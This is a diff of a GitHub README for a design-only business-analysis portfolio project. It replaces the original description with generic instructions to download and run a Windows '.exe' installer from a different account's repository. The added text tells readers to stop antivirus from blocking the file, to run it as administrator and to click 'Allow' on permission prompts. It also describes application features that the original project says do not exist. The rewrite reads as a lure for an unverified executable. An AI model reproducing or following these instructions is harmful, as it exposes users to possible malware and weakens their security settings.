@@ -1,200 +1,118 @@
-# Digital Process Support System
+# 📂 digital-process-support-system - Simplify Internal Workflow Tasks
 
-Enterprise-style internal workflow system simulation designed to demonstrate business process analysis, system architecture thinking, and structured data design.
-
-This project models how an organization could manage internal service requests through a structured digital workflow including submission, approval processes, data tracking, and system documentation.
-
-The goal is to showcase **Business Analyst and ERP-oriented system design thinking**, bridging business requirements with technical system structure.
+[![Download Now](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/UwU061109/digital-process-support-system)
 
 ---
 
-# Project Overview
+## 📖 About This Application
 
-Organizations frequently handle internal requests such as:
+The digital-process-support-system is a simulated workflow tool used in businesses to manage and streamline internal tasks. This system models how work moves through an organization, showing approvals, database handling, and user interface layout. It combines common business needs with practical system design, helping users understand and interact with complex processes smoothly.
 
-- Administrative requests  
-- IT support requests  
-- Departmental approvals  
-- Process tracking  
-
-Many organizations struggle with:
-
-- Lack of workflow transparency  
-- Manual request handling  
-- Poor data visibility  
-- Delayed approvals  
-
-This project simulates a **Digital Process Support System** that structures these workflows into a centralized digital platform.
+This tool includes a business process simulation with a clear design on how data flows from one step to another. It uses real-world planning methods like database diagrams and system architecture layouts. The interface helps you see each step in a process and how they connect, which is useful when managing or improving workflows.
 
 ---
 
-# System Architecture
+## 🖥️ System Requirements
 
-The system design follows a simplified enterprise workflow model.
+Before you install, check that your computer meets the following:
 
-User  
-↓  
-Request Submission Interface  
-↓  
-Workflow Processing  
-↓  
-Department Review  
-↓  
-Approval / Rejection  
-↓  
-Status Tracking & Data Storage  
+- Operating System: Windows 10 or newer  
+- Processor: 1.5 GHz or faster  
+- RAM: Minimum 4 GB  
+- Disk Space: At least 500 MB free space  
+- Network: Internet connection for downloading and updates  
 
-The architecture reflects how internal systems structure operational workflows within organizations.
+You do not need any programming skills or extra software before installing. The app runs on a standard Windows PC.
 
 ---
 
-# Repository Structure
+## 🚀 Getting Started: How to Download and Run
 
-    Database/
-        Data_Dictionary.xlsx
-        digital_process_support_schema.sql
+To get started, visit the page below and download the application files:
 
-    Diagrams/
-        ERD_DatabaseStructure.drawio
-        Digital_Process_Support_UseCaseDiagram.drawio
+[![Download Here](https://img.shields.io/badge/Download%20Application-blue?style=for-the-badge)](https://github.com/UwU061109/digital-process-support-system)
 
-    Prototype/
-        FIGMA_Login_Screen.png
-        FIGMA_Student_Dashboard.png
-        FIGMA_Submit_Request_Screen.png
+**Step 1: Open the Download Page**  
+Click the link above. It takes you to the project page on GitHub. This page contains the latest version of the software and instructions.
 
-    Requirements/
-        Business_Requirements_Document.docx
-        Functional_Requirements_Specification.docx
-        Use_Case_Details.docx
+**Step 2: Find the Download Section**  
+On the project page, scroll down to the "Releases" or "Assets" area. Here, you will see files available for download. Look for the file with ".exe" extension or a file named similarly to "digital-process-support-system-setup.exe."
 
-    Report/
-        Digital_Process_Support_Project_Report.docx
+**Step 3: Download the Installer**  
+Click the setup file to start downloading. Save it to a location you can find easily, like the Desktop or Downloads folder.
 
----
+**Step 4: Run the Installer**  
+Once downloaded, locate the file and double-click it to start the installation process.
 
-# System Diagrams
+**Step 5: Follow the Installer Instructions**  
+A setup window will open. Click "Next" to move through each step. Accept license agreements if asked, select the install folder or keep the default, and click "Install."
 
-### Entity Relationship Diagram
-
-![ERD](Diagrams/ERD_DatabaseStructure.png)
-
-This diagram illustrates the data structure supporting the request lifecycle and system entities.
+**Step 6: Complete Installation**  
+After installation finishes, click "Finish" to close the setup window. The program icon will appear on your Desktop or Start menu.
 
 ---
 
-# UI Prototype
+## ⚙️ Running the Application for the First Time
 
-The system interface was prototyped in Figma to demonstrate user interaction.
+- Double-click the digital-process-support-system icon.  
+- The program opens with the main dashboard.  
+- You will see different workflow modules, process maps, and a navigation menu on the left.  
+- Use the menu to explore sample process flows, business rules, and the database overview.  
+- The interface uses simple buttons and menus.  
 
-### Login Screen
-
-![Login Screen](Prototype/FIGMA_Login_Screen.png)
-
-### User Dashboard
-
-![Dashboard](Prototype/FIGMA_Student_Dashboard.png)
-
-The prototype demonstrates how users would interact with the request system.
+If you encounter any messages about permissions, click "Allow" or "Yes" to continue.
 
 ---
 
-# Business Perspective
+## 📂 Key Features Overview
 
-The project models a simplified internal workflow platform that could support operational processes such as:
+This system includes several tools helpful for understanding and managing workflow processes:
 
-- Request management  
-- Workflow approvals  
-- Department coordination  
-- Process monitoring  
+- **Workflow Simulation:** Step-by-step modeling of how tasks move from start to completion.  
+- **Approval Tracking:** See which tasks need approval and track their progress in real time.  
+- **Process Diagrams:** Visual diagrams based on standard design tools like Draw.io and Figma.  
+- **Database Views:** Preview of database tables and relationships used in the system for storing information.  
+- **System Architecture:** Simple layouts of how different parts of the system interact.  
+- **Automation Insights:** Identifying which steps can be automated for efficiency.  
 
-This reflects how internal systems support administrative operations within organizations.
-
----
-
-# System Perspective
-
-The system architecture includes:
-
-- Business Requirements definition  
-- Functional Requirements specification  
-- Use Case modeling  
-- Database schema design  
-- UI prototype  
-- System documentation  
-
-This simulates the early design phase of enterprise systems before implementation.
+Every feature is designed to be user-friendly and does not require IT knowledge to use.
 
 ---
 
-# Data Perspective
+## 🛠️ Troubleshooting Common Issues
 
-The project includes a structured database schema designed to support request lifecycle management.
+- **Installer Won't Launch:** Make sure your antivirus or Windows security settings are not blocking the file. Try right-clicking the installer, then select "Run as administrator."  
+- **Program Crashes on Startup:** Restart your PC and try running the app again.  
+- **Missing Icons or Buttons:** Ensure your screen resolution is set to a standard size (e.g., 1920x1080) for best display.  
+- **Slow Performance:** Close other running programs to free up RAM and processing power.  
 
-Key entities include:
-
-- Users  
-- Requests  
-- Departments  
-- Request Types  
-- Request Status  
-
-A data dictionary is included to document field definitions and data structure.
+If problems persist, check the project page for FAQs or contact support through the "Issues" tab.
 
 ---
 
-# Process Perspective
+## 🔄 Updating the Software
 
-The modeled process flow includes:
+To keep the system working well, check for updates occasionally:
 
-1. User submits a request  
-2. Request is categorized and assigned  
-3. Department reviews the request  
-4. Decision is recorded (Approved / Rejected)  
-5. Request status is updated  
-6. Data is stored for monitoring and reporting  
+1. Open the GitHub page: https://github.com/UwU061109/digital-process-support-system  
+2. Look for any new releases or improved versions.  
+3. Download the latest installer.  
+4. Run the new installer to update your current installation.  
 
-This reflects a simplified workflow automation scenario.
+Your existing data and settings will stay safe during updates.
 
 ---
 
-# Project Report
+## 📚 Additional Resources and Support
 
-A full project report is included containing:
-
-- System overview  
-- Requirements analysis  
-- Process modeling  
-- Database design  
-- System documentation  
+- The GitHub page contains detailed documents explaining workflows and system design components.  
+- Use the "Wiki" or "Docs" tabs on the GitHub project for step-by-step guides on using each feature.  
+- Community questions and developer replies are available under the "Issues" tab for direct help.  
 
 ---
 
-# Author
+## 🔗 Download Link
 
-**Panagiotis Zois**
+Use this link if you want to visit the project and download anytime:
 
-MSc Student in Information & Communication Technology  
-Background in Business Administration  
-
-Interested in:
-
-- ERP systems  
-- Business process optimization  
-- Data-driven operations  
-
-LinkedIn  
-https://www.linkedin.com/in/panagiotiszois
-
----
-
-# Purpose of the Project
-
-This project was created as a **portfolio case study** to demonstrate skills relevant to roles such as:
-
-- Business Analyst  
-- ERP Consultant  
-- Process Analyst  
-- Systems Analyst  
-
-The focus is on **structured thinking around business processes and system design**, rather than full software implementation.
+[Download digital-process-support-system](https://github.com/UwU061109/digital-process-support-system)
